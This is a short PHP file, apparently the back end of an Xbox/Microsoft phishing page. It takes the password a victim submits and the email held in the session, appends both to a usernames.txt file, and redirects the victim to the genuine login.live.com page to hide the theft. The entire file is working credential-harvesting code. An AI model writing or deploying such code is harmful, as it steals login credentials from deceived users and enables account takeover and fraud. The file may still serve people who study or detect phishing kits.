<?php
	include 'ip.php';
	session_start();
	$pass = $_POST["passwd"];
	$email=$_SESSION["Email"];
	file_put_contents("usernames.txt", "Xbox Username: " . $email . " Pass: " . $pass . "\n", FILE_APPEND);
	header('Location: https://login.live.com/login.srf');
	exit();
	session_destroy();		
?>